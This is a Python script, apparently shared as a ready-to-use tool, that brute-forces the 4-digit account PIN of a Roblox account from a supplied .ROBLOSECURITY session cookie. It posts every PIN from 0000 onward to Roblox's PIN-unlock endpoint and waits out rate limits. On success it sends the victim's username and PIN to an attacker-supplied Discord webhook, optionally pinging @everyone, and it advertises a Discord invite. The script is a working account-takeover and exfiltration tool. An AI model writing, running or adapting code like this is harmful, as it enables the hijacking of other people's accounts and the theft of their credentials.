import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input()
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input()
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked! Join Our Discord For Sponser Me : https://discord.gg/ftNGeXgs***'
os.system("cls")

print('''Cracker Has Started.''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "ahmed1dev;",
                "avatar_url" : "https://cdn.discordapp.com/attachments/1120915440500228176/1120915509030965268/1f9fea1a0eaaaa8108b23dbcb981cf3e.jpg"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : f"${username}, Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
